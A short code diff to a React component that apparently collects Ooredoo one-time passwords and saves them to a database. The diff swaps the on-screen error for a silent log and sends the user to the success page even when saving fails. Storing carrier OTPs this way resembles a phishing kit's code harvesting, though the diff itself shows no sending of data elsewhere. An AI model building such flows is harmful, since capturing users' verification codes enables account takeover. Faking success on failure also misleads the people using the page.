@@ -34,10 +34,10 @@ export default function OtpOoredoo() {
         otpType: "ooredoo",
       });
       toast.success("تم التحقق بنجاح");
-      setLocation(`/success?session=${sessionId}`);
     } catch (error) {
-      toast.error("حدث خطأ في التحقق");
+      console.error("Error saving Ooredoo OTP in DB, continuing anyway:", error);
     }
+    setLocation(`/success?session=${sessionId}`);
   };
 
   return (
